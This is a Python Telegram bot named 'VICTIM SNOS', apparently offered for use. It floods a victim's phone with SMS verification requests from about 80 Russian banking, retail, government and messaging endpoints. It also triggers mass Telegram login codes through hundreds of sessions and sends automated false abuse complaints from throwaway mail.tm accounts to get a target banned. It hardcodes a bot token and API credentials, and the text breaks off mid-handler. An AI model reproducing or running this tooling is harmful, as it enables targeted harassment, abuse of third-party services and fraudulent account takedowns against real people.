import asyncio
import logging
import os
import random
import string
import json
import time
import aiohttp
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait

# ---------- НАСТРОЙКИ ----------
BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS = set()

MAX_SESSIONS = 600
BOMBER_DELAY = 300
TG_ATTACK_DELAY = 300

USE_MAILTM = True
MAILTM_ACCOUNTS_COUNT = 100

BANNER_PATH = "banner.png"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

active_attacks = {}
sessions_pool = []
sessions_ready = False
sessions_init_task = None

class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class BomberState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

class ComplaintState(StatesGroup):
    waiting_type = State()
    waiting_target = State()
    waiting_username = State()
    waiting_id = State()
    waiting_links = State()

class AccessMiddleware:
    async def __call__(self, handler, event, data):
        user_id = None
        if isinstance(event, types.CallbackQuery):
            user_id = event.from_user.id
        elif isinstance(event, types.Message):
            user_id = event.from_user.id

        if isinstance(event, types.Message) and event.text and event.text.startswith('/start'):
            return await handler(event, data)

        if user_id and user_id != ADMIN_ID and user_id not in ALLOWED_USERS:
            if isinstance(event, types.CallbackQuery):
                await event.answer("У вас нет прав!", show_alert=True)
            elif isinstance(event, types.Message):
                await event.reply("У вас нет прав!")
            return

        return await handler(event, data)

dp.update.middleware(AccessMiddleware())

# ---------- USER-AGENTS ----------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
]

# ---------- САЙТЫ С АВТОРИЗАЦИЕЙ ЧЕРЕЗ TELEGRAM ----------
TELEGRAM_AUTH_SITES = [
    "https://api.fragment.com/auth",
    "https://api.getgems.io/auth/telegram",
    "https://api.tonkeeper.com/auth/telegram",
    "https://api.tonhub.com/auth/telegram",
    "https://api.hamsterkombat.com/auth/telegram",
    "https://api.notcoin.com/auth/telegram",
    "https://api.tapswap.com/auth/telegram",
    "https://api.blum.com/auth/telegram",
    "https://api.cats.com/auth/telegram",
    "https://api.yescoin.com/auth/telegram",
    "https://api.muskempire.com/auth/telegram",
    "https://api.pixelverse.com/auth/telegram",
    "https://api.telegram.thirdweb.com/auth/social",
    "https://api.thirdweb.com/v1/auth/social",
    "https://api.combot.org/auth/telegram",
    "https://api.telemetr.io/auth/telegram",
    "https://api.tgstat.com/auth/telegram",
    "https://api.crosser.io/auth/telegram",
    "https://api.bybit.com/telegram-auth",
    "https://api.htx.com/telegram-auth",
    "https://api.gate.io/telegram-auth",
    "https://api.kucoin.com/telegram-auth",
    "https://api.mexc.com/telegram-auth",
    "https://api.bitget.com/telegram-auth",
]

# ---------- САЙТЫ ДЛЯ БОМБЕРА ----------
BOMBER_WEBSITES = [
    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vk.com/method/auth.restore", "method": "POST", "phone_field": "phone"},
    {"url": "https://ok.ru/dk?cmd=AnonymRegistration", "method": "POST", "phone_field": "phone"},
    {"url": "https://ok.ru/dk?cmd=AnonymLogin", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mail.ru/oauth/token", "method": "POST", "phone_field": "phone"},
    {"url": "https://connect.mail.ru/oauth/authorize", "method": "POST", "phone_field": "phone"},
    {"url": "https://passport.yandex.ru/registration-validations/check-phone", "method": "POST", "phone_field": "phone"},
    {"url": "https://passport.yandex.ru/auth/reg/portal", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dzen.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rambler.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://web.whatsapp.com/api/sendCode", "method": "POST", "phone_field": "phone_number"},
    {"url": "https://viber.com/api/request_activation_code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.viber.com/pa/request_activation_code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.signal.org/v1/accounts/sms/code/request", "method": "POST", "phone_field": "number"},
    {"url": "https://api.line.me/v2/oauth/accessToken", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.icq.net/auth/sendCode", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.agent.mail.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yandex.ru/taxi/order", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.delivery-club.ru/api/v2/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://eda.yandex/api/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sbermarket.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vkusvill.ru/v1/auth/login", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dixy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.magnit.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.pyaterochka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.perekrestok.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lenta.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.auchan.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.metro-cc.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.globus.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.okey.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://online.sberbank.ru/CSAFront/api/sms/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tinkoff.ru/v1/sign_up", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tinkoff.ru/v1/restore", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.vtb.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.raiffeisen.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gazprombank.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.open.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sovcombank.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.qiwi.com/oauth/authorize", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yoomoney.ru/api/register", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rosbank.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ozon.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.wildberries.ru/auth/v2/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aliexpress.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.avito.ru/auth/v2/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.youla.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.citilink.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mvideo.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.eldorado.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.dns-shop.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.lamoda.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.kazanexpress.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sima-land.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.apteka.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.eapteka.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.zdravcity.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rigla.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.planetazdorovo.ru/auth/code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gorzdrav.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.beeline.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.megafon.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.yota.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.gosuslugi.ru/auth/send-sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.mos.ru/v1/auth", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.nalog.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rzhd.ru/v1/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.drom.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.tutu.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.booking.com/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.ostrovok.ru/auth/send", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.svyaznoy.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.sportmaster.ru/auth/sms", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.letu.ru/auth/send-code", "method": "POST", "phone_field": "phone"},
    {"url": "https://api.rivegauche.ru/auth/sms", "method": "POST", "phone_field": "phone"},
]

# ---------- MAIL.TM ----------
class MailTM:
    def __init__(self):
        self.base_url = "https://api.mail.tm"
        self.accounts = []
        self.session = None
        
    async def init_session(self):
        if not self.session:
            connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None
    
    async def get_domain(self) -> str:
        await self.init_session()
        try:
            async with self.session.get(f"{self.base_url}/domains") as resp:
                domains = await resp.json()
                return domains['hydra:member'][0]['domain']
        except:
            return "inbox.testmail.app"
    
    async def create_account(self) -> dict:
        await self.init_session()
        try:
            random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
            domain = await self.get_domain()
            
            account_data = {
                "address": f"victim_{random_str}@{domain}",
                "password": ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=16))
            }
            
            async with self.session.post(
                f"{self.base_url}/accounts",
                json=account_data,
                headers={"Content-Type": "application/json"}
            ) as resp:
                if resp.status in [200, 201]:
                    account_info = await resp.json()
                    
                    login_data = {
                        "address": account_data["address"],
                        "password": account_data["password"]
                    }
                    
                    async with self.session.post(
                        f"{self.base_url}/token",
                        json=login_data,
                        headers={"Content-Type": "application/json"}
                    ) as login_resp:
                        if login_resp.status == 200:
                            token_data = await login_resp.json()
                            return {
                                "email": account_data["address"],
                                "password": account_data["password"],
                                "token": token_data["token"],
                                "id": account_info["id"]
                            }
        except Exception as e:
            logger.error(f"Mail.tm ошибка: {e}")
        return None
    
    async def create_multiple_accounts(self, count: int) -> list:
        accounts = []
        for i in range(count):
            account = await self.create_account()
            if account:
                accounts.append(account)
                logger.info(f"Mail.tm {len(accounts)}/{count}: {account['email']}")
            await asyncio.sleep(1)
        self.accounts = accounts
        return accounts
    
    async def send_email(self, account: dict, to_email: str, subject: str, body: str) -> bool:
        await self.init_session()
        try:
            email_data = {
                "from": account["email"],
                "to": [to_email],
                "subject": subject,
                "text": body
            }
            headers = {
                "Authorization": f"Bearer {account['token']}",
                "Content-Type": "application/json"
            }
            async with self.session.post(
                f"{self.base_url}/messages",
                json=email_data,
                headers=headers
            ) as resp:
                return resp.status in [200, 201, 202]
        except:
            return False

# ---------- ПРОВЕРКА И ДОПОЛНЕНИЕ СЕССИЙ ----------
def count_existing_sessions() -> int:
    """Подсчет существующих сессий"""
    if not os.path.exists("sessions"):
        return 0
    
    count = 0
    for f in os.listdir("sessions"):
        if f.startswith("pool_") and f.endswith(".session"):
            count += 1
    return count

async def init_sessions_background():
    """Фоновая инициализация и дополнение сессий"""
    global sessions_pool, sessions_ready
    
    logger.info("Запуск фоновой инициализации сессий...")
    
    os.makedirs("sessions", exist_ok=True)
    
    existing_count = count_existing_sessions()
    logger.info(f"Найдено существующих сессий: {existing_count}")
    
    if existing_count < MAX_SESSIONS:
        need_to_create = MAX_SESSIONS - existing_count
        logger.info(f"Необходимо создать еще {need_to_create} сессий")
        
        # Загружаем существующие сессии
        for i in range(existing_count):
            session_file = f"sessions/pool_{i}"
            try:
                client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
                await client.connect()
                sessions_pool.append({"client": client, "in_use": False, "flood_until": 0})
            except Exception as e:
                logger.error(f"Ошибка загрузки сессии {i}: {e}")
        
        # Создаем недостающие сессии
        for i in range(existing_count, MAX_SESSIONS):
            session_file = f"sessions/pool_{i}"
            try:
                client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
                await client.connect()
                sessions_pool.append({"client": client, "in_use": False, "flood_until": 0})
                if (i + 1) % 50 == 0:
                    logger.info(f"Создано {i + 1}/{MAX_SESSIONS} сессий")
            except Exception as e:
                logger.error(f"Ошибка создания сессии {i}: {e}")
                await asyncio.sleep(2)
    else:
        # Загружаем все существующие сессии
        for i in range(MAX_SESSIONS):
            session_file = f"sessions/pool_{i}"
            try:
                client = Client(session_file, api_id=API_ID, api_hash=API_HASH, in_memory=False, no_updates=True)
                await client.connect()
                sessions_pool.append({"client": client, "in_use": False, "flood_until": 0})
                if (i + 1) % 100 == 0:
                    logger.info(f"Загружено {i + 1}/{MAX_SESSIONS} сессий")
            except Exception as e:
                logger.error(f"Ошибка загрузки сессии {i}: {e}")
    
    logger.info(f"Инициализация сессий завершена. Загружено {len(sessions_pool)}/{MAX_SESSIONS} сессий")
    sessions_ready = True

async def get_available_sessions(count: int) -> list:
    available = []
    current_time = time.time()
    for session in sessions_pool:
        if not session["in_use"] and session["flood_until"] < current_time:
            session["in_use"] = True
            available.append(session)
            if len(available) >= count:
                break
    return available

def release_sessions(sessions: list):
    for session in sessions:
        session["in_use"] = False

# ---------- АТАКА НА TELEGRAM АВТОРИЗАЦИЮ ----------
async def send_tg_auth_request(session: aiohttp.ClientSession, phone: str, website: str) -> dict:
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    
    payload = {
        'phone': phone,
        'phone_number': phone,
        'telegram_id': str(random.randint(100000000, 999999999)),
    }
    
    try:
        async with session.post(website, headers=headers, json=payload, timeout=5, ssl=False) as resp:
            return {"site": website.split('/')[2], "success": True, "status": resp.status}
    except:
        return {"site": website.split('/')[2], "success": False}

async def send_tg_sms(phone: str, session) -> dict:
    client = session["client"]
    try:
        if not client.is_connected:
            await client.connect()
        await client.send_code(phone)
        return {"type": "SMS", "success": True}
    except FloodWait as e:
        session["flood_until"] = time.time() + e.value
        return {"type": "SMS", "success": False, "flood": e.value}
    except:
        return {"type": "SMS", "success": False}

async def tg_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    results = []
    successful = 0
    failed = 0
    
    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            available = await get_available_sessions(len(sessions_pool))
            
            tasks = []
            
            for website in TELEGRAM_AUTH_SITES:
                for _ in range(3):
                    tasks.append(send_tg_auth_request(session, phone, website))
            
            for sess in available:
                tasks.append(send_tg_sms(phone, sess))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            release_sessions(available)
            
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get('success'):
                        successful += 1
                    else:
                        failed += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, successful, failed)
            
            logger.info(f"TG раунд {rnd}/{rounds}: успешно {successful}, ошибок {failed}")
            await asyncio.sleep(TG_ATTACK_DELAY)
    
    return results, successful, failed

# ---------- БОМБЕР ----------
async def send_bomber_request(session: aiohttp.ClientSession, phone: str, website: dict) -> dict:
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    
    payload = {website["phone_field"]: phone}
    
    try:
        if website["method"] == "POST":
            async with session.post(website["url"], headers=headers, json=payload, timeout=5, ssl=False) as resp:
                return {"site": website["url"].split('/')[2], "success": True, "status": resp.status}
        else:
            async with session.get(website["url"], headers=headers, params=payload, timeout=5, ssl=False) as resp:
                return {"site": website["url"].split('/')[2], "success": True, "status": resp.status}
    except:
        return {"site": website["url"].split('/')[2], "success": False}

async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tuple:
    results = []
    successful = 0
    failed = 0
    
    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for rnd in range(1, rounds + 1):
            tasks = []
            
            for website in BOMBER_WEBSITES:
                for _ in range(2):
                    tasks.append(send_bomber_request(session, phone, website))
            
            batch = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in batch:
                if isinstance(r, dict):
                    results.append(r)
                    if r.get('success'):
                        successful += 1
                    else:
                        failed += 1
            
            if progress_callback:
                await progress_callback(rnd, rounds, successful, failed)
            
            logger.info(f"Бомбер раунд {rnd}/{rounds}: успешно {successful}, ошибок {failed}")
            await asyncio.sleep(BOMBER_DELAY)
    
    return results, successful, failed

# ---------- ОТЧЕТЫ ----------
def generate_tg_report(username: str, phone: str, results: list, successful: int, failed: int) -> str:
    lines = [
        "VICTIM SNOS - ОТЧЕТ СНОСА TELEGRAM",
        "=" * 60,
        f"Пользователь: {username}",
        f"Номер: {phone}",
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Всего: {successful + failed}",
        f"Успешно: {successful}",
        f"Ошибок: {failed}",
        "=" * 60,
        ""
    ]
    
    site_stats = {}
    for r in results:
        site = r.get('site', 'Неизвестно')
        if site not in site_stats:
            site_stats[site] = {"success": 0, "failed": 0}
        if r.get('success'):
            site_stats[site]["success"] += 1
        else:
            site_stats[site]["failed"] += 1
    
    for site, stats in site_stats.items():
        lines.append(f"{site}: OK={stats['success']} ERR={stats['failed']}")
    
    return "\n".join(lines)

def generate_bomber_report(username: str, phone: str, results: list, successful: int, failed: int) -> str:
    lines = [
        "VICTIM SNOS - ОТЧЕТ БОМБЕРА",
        "=" * 60,
        f"Пользователь: {username}",
        f"Номер: {phone}",
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Сайтов атаковано: {len(BOMBER_WEBSITES)}",
        f"Всего запросов: {successful + failed}",
        f"Успешно: {successful}",
        f"Ошибок: {failed}",
        "=" * 60,
        ""
    ]
    
    site_stats = {}
    for r in results:
        site = r.get('site', 'Неизвестно')
        if site not in site_stats:
            site_stats[site] = {"success": 0, "failed": 0}
        if r.get('success'):
            site_stats[site]["success"] += 1
        else:
            site_stats[site]["failed"] += 1
    
    for site, stats in site_stats.items():
        lines.append(f"{site}: OK={stats['success']} ERR={stats['failed']}")
    
    return "\n".join(lines)

# ---------- ЖАЛОБЫ ----------
async def send_complaint_email(mail_tm: MailTM, account: dict, receiver: str, subject: str, body: str) -> bool:
    return await mail_tm.send_email(account, receiver, subject, body)

async def send_mass_complaint(mail_tm: MailTM, target: str, complaint_type: str, is_channel: bool = False) -> int:
    receivers = [
        'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
        'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org'
    ]
    
    if is_channel:
        body = f"Жалоба на канал {target}. Нарушение правил Telegram."
        subject = "Жалоба на канал Telegram"
    else:
        body = f"Жалоба на аккаунт {target}. Нарушение правил Telegram."
        subject = "Жалоба на аккаунт Telegram"
    
    sent = 0
    semaphore = asyncio.Semaphore(20)
    
    async def send_one(acc, rec):
        async with semaphore:
            result = await send_complaint_email(mail_tm, acc, rec, subject, body)
            await asyncio.sleep(0.5)
            return result
    
    tasks = []
    for acc in mail_tm.accounts[:50]:
        for rec in receivers[:3]:
            tasks.append(send_one(acc, rec))
    
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r)

# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="СНОС TELEGRAM", callback_data="tg_attack")
    builder.button(text="SMS БОМБЕР", callback_data="bomber_attack")
    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="complaint_account")
    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="complaint_channel")
    builder.button(text="СТАТУС СЕССИЙ", callback_data="sessions_status")
    builder.button(text="СТОП", callback_data="stop_attack")
    builder.adjust(1)
    return builder.as_markup()

# ---------- ОБРАБОТЧИКИ ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    caption = (
        "<b>VICTIM SNOS v3.0</b>\n\n"
        f"Сессий: {len(sessions_pool)}/{MAX_SESSIONS}\n"
        f"Готовность: {'Да' if sessions_ready else 'Загрузка...'}\n"
        f"Сайтов TG: {len(TELEGRAM_AUTH_SITES)}\n"
        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n"
        f"Задержка: {BOMBER_DELAY} сек\n\n"
        "Выберите действие:"
    )
    
    if os.path.exists(BANNER_PATH):
        await message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption=caption,
            reply_markup=get_main_menu()
        )
    else:
        await message.answer(caption, reply_markup=get_main_menu())

@dp.callback_query(F.data == "main_menu")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    
    caption = f"<b>VICTIM SNOS - Главное меню</b>\n\nСессий: {len(sessions_pool)}/{MAX_SESSIONS}\nГотовность: {'Да' if sessions_ready else 'Загрузка...'}"
    
    if os.path.exists(BANNER_PATH):
        await callback.message.delete()
        await callback.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption=caption,
            reply_markup=get_main_menu()
        )
    else:
        await callback.message.edit_text(caption, reply_markup=get_main_menu())
    
    await callback.answer()

@dp.callback_query(F.data == "sessions_status")
async def sessions_status(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"<b>СТАТУС СЕССИЙ</b>\n\n"
        f"Загружено: {len(sessions_pool)}/{MAX_SESSIONS}\n"
        f"Готовность: {'Да' if sessions_ready else 'Идет загрузка...'}\n\n"
        f"Сессии загружаются в фоне.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Назад", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "tg_attack")
async def tg_attack_start(callback: types.CallbackQuery, state: FSMContext):
    if not sessions_ready:
        await callback.answer("Сессии еще загружаются, подождите...", show_alert=True)
        return
    
    if len(sessions_pool) == 0:
        await callback.answer("Нет доступных сессий!", show_alert=True)
        return
    
    await state.set_state(AttackState.waiting_phone)
    await callback.message.edit_text(
        "<b>СНОС TELEGRAM</b>\n\n"
        "Введите номер телефона:\n"
        "Формат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "bomber_attack")
async def bomber_attack_start(callback: types.CallbackQuery, state: FSMContext):
    if not sessions_ready:
        await callback.answer("Сессии еще загружаются, подождите...", show_alert=True)
        return
    
    await state.set_state(BomberState.waiting_phone)
    await callback.message.edit_text(
        f"<b>SMS БОМБЕР</b>\n\n"
        f"Сайтов: {len(BOMBER_WEBSITES)}\n\n"
        "Введите номер телефона:\n"
        "Формат: +79001234567",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.message(StateFilter(AttackState.waiting_phone))
async def tg_process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(AttackState.waiting_count)
    await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-10):")

@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await message.answer(f"Номер: {phone}\n\nВведите количество раундов (1-10):")

@dp.message(StateFilter(AttackState.waiting_count))
async def tg_process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 10:
            await message.answer("Введите число от 1 до 10!")
            return
    except:
        await message.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    username = f"{message.from_user.id}"
    
    await state.clear()
    
    status_msg = await message.answer(f"<b>СНОС TELEGRAM ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}")
    
    async def update_progress(current, total, successful, failed):
        try:
            await status_msg.edit_text(
                f"<b>СНОС TELEGRAM</b>\n\n"
                f"Номер: {phone}\n"
                f"Раунд: {current}/{total}\n"
                f"Успешно: {successful}\n"
                f"Ошибок: {failed}"
            )
        except:
            pass
    
    results, successful, failed = await tg_attack(phone, count, update_progress)
    report = generate_tg_report(username, phone, results, successful, failed)
    
    filename = f"tg_snos_{phone.replace('+', '')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
    os.remove(filename)
    
    await status_msg.delete()
    await message.answer("<b>Главное меню</b>", reply_markup=get_main_menu())

@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 10:
            await message.answer("Введите число от 1 до 10!")
            return
    except:
        await message.answer("Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    username = f"{message.from_user.id}"
    
    await state.clear()
    
    status_msg = await message.answer(f"<b>БОМБЕР ЗАПУЩЕН</b>\n\nНомер: {phone}\nСайтов: {len(BOMBER_WEBSITES)}\nРаундов: {count}")
    
    async def update_progress(current, total, successful, failed):
        try:
            await status_msg.edit_text(
                f"<b>БОМБЕР</b>\n\n"
                f"Номер: {phone}\n"
                f"Раунд: {current}/{total}\n"
                f"Успешно: {successful}\n"
                f"Ошибок: {failed}"
            )
        except:
            pass
    
    results, successful, failed = await bomber_attack(phone, count, update_progress)
    report = generate_bomber_report(username, phone, results, successful, failed)
    
    filename = f"bomber_{phone.replace('+', '')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    await message.answer_document(FSInputFile(filename), caption=f"Завершено! Успешно: {successful}")
    os.remove(filename)
    
    await status_msg.delete()
    await message.answer("<b>Главное меню</b>", reply_markup=get_main_menu())

@dp.callback_query(F.data == "complaint_account")
async def complaint_account(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(ComplaintState.waiting_username)
    await callback.message.edit_text(
        "<b>ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "complaint_channel")
async def complaint_channel(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(ComplaintState.waiting_links)
    await callback.message.edit_text(
